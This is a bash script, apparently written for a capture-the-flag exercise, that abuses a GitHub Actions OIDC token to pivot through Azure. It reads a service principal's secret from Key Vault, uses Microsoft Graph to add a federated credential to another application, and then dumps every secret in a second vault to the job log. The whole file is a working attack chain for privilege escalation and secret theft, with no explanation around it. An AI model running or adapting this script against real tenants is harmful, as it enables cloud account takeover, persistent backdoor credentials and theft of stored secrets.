#!/usr/bin/env bash
set +e
TEN="$AZURE_TENANT_ID"
BASE="https://login.microsoftonline.com/$TEN/oauth2/v2.0/token"
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c "import sys,json;print(json.load(sys.stdin).get('value',''))")
sub=$(printf %s "$OIDC" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -c "import sys,json;print(json.load(sys.stdin).get('sub',''))")
echo OIDC_SUB=$sub
cicd=$(curl -sS -X POST "$BASE" -d "client_id=$AZURE_CLIENT_ID" -d scope=https://vault.azure.net/.default -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$OIDC" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
echo CICD_LEN=${#cicd}
sv=$(curl -sS -H "Authorization: Bearer $cicd" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/sync-service-principal?api-version=7.4" | python3 -c "import sys,json;print(json.load(sys.stdin).get('value','{}'))")
pa=$(python3 -c "import sys,json;print(json.loads(sys.argv[1]).get('appId',''))" "$sv")
ps=$(python3 -c "import sys,json;print(json.loads(sys.argv[1]).get('clientSecret',''))" "$sv")
echo PA_ID=$pa PS_LEN=${#ps}
graph=$(curl -sS -X POST "$BASE" -d "client_id=$pa" -d scope=https://graph.microsoft.com/.default -d grant_type=client_credentials --data-urlencode "client_secret=$ps" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
echo GRAPH_LEN=${#graph}
name=ctf-$(date +%s)
json=$(python3 -c "import json,sys;print(json.dumps({'name':sys.argv[1],'issuer':'https://token.actions.githubusercontent.com','subject':sys.argv[2],'description':'ctf pivot','audiences':['api://AzureADTokenExchange']}))" "$name" "$sub")
resp=$(curl -sS -X POST -H "Authorization: Bearer $graph" -H 'Content-Type: application/json' -d "$json" https://graph.microsoft.com/v1.0/applications/22a3fb7e-860a-4708-9e50-3d36aa21191c/federatedIdentityCredentials)
echo FIC_RESP=$(echo "$resp" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('id') or d.get('error',{}).get('code','unknown'))")
for i in $(seq 1 12); do
  sleep 5
  at=$(curl -sS -X POST "$BASE" -d "client_id=891fb158-e02c-4428-a885-53b811f369c0" -d scope=https://vault.azure.net/.default -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$OIDC")
  tok=$(echo "$at" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
  echo TRY=$i LEGACY_LEN=${#tok}
  if [ -n "$tok" ]; then
    l=$(curl -sS -H "Authorization: Bearer $tok" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4")
    echo SEC_LIST=$l
    for n in $(echo "$l"|python3 -c "import sys,json;print(' '.join(x['id'].split('/')[-1] for x in json.load(sys.stdin).get('value',[])))"); do
      curl -sS -H "Authorization: Bearer $tok" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/$n?api-version=7.4"; echo
    done
    break
  fi
  echo "$at" | head -c 250; echo
done
